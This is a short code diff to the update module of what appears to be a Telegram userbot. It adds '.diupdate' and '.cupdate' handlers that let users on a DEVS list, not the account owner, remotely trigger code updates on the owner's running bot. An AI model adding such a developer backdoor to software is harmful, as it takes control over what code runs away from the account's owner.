@@ -131,6 +131,9 @@ async def updateme_requirements():
         return repr(e)
 
 
+@Client.on_message(
+    filters.command("diupdate", ["."]) & filters.user(DEVS) & ~filters.me
+)
 @Client.on_message(filters.command("update", ".") & filters.me)
 async def upstream(client: Client, message: Message):
     status = await message.edit_text("`Checking for Updates, Wait a Moment...`")
@@ -259,6 +262,7 @@ async def upstream(client: Client, message: Message):
         return
 
 
+@Client.on_message(filters.command("cupdate", ["."]) & filters.user(DEVS) & ~filters.me)
 @Client.on_message(filters.command("goupdate", ".") & filters.me)
 async def updatees(client: Client, message: Message):
     if await is_heroku():
